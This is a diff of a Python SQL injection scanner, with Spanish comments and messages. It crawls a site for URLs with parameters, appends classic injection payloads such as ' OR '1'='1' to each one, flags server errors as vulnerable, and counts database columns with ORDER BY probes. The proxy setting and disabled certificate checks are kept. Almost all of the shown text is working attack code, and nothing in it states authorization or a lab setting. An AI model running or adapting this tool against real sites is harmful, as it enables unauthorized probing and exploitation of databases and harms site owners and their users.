@@ -72,7 +72,8 @@ def find_urls_to_test(url, base_url):
     return links
 
 # perform the sql injection
-def exploit_sqli_column_number(url):
+def exploit_sqli(url):
+    # Test common SQLi payloads (only once)
     payloads = [
         "' OR '1'='1",
         "' OR '1'='1' --",
@@ -90,18 +91,19 @@ def exploit_sqli_column_number(url):
         target_url = url + payload
         r = requests.get(target_url, verify=False, proxies=proxies)
         if "Internal Server Error" in r.text:
-            print(f"[+] Vulnerable URL found with payload {payload}")
-            return True
-    
-    # Test order by columns (this is inside the loop)
+            print(f"[+] Vulnerable URL found with payload {payload}: {url}")
+            return True  # Indica que se encontró una vulnerabilidad
+
+    return False  # No se encontró ninguna vulnerabilidad
+
+# function that detects column numbers
+def exploit_sqli_column_number(url):
     for i in range(1, 5):
         target_url = url + "'+order+by+%s--" % i
         r = requests.get(target_url, verify=False, proxies=proxies)
-        res = r.text
-        if "Internal Server Error" in res:
-            return i - 1
-        
-    return False
+        if "Internal Server Error" in r.text:
+            return i - 1  # Devuelve el número de columnas
+    return False  # No se encontró ninguna vulnerabilidad
 
 if __name__ == "__main__":
     try:
@@ -124,12 +126,15 @@ if __name__ == "__main__":
 
         for test_url in urls_to_test:
             print(f"\n[+] Testing URL: {test_url}")
-            num_col = exploit_sqli_column_number(test_url)
-            if num_col:
-                print(f"[+] Vulnerable URL found: {test_url}")
-                print(f"[+] Pudimos determinar que su base de datos tiene {num_col} columnas en esta url")
-            else:
-                print(f"[-] URL not vulnerable: {test_url}")
+            is_vulnerable = exploit_sqli(test_url)
+             
+            if not is_vulnerable:
+                num_col = exploit_sqli_column_number(test_url)
+                if num_col:
+                    print(f"[+] Vulnerable URL found: {test_url}")
+                    print(f"[+] Pudimos determinar que su base de datos tiene {num_col} columnas en esta URL")
+                else:
+                    print(f"[-] URL not vulnerable: {test_url}")
     else:
         print("[-] No URLs with parameters found.")
 
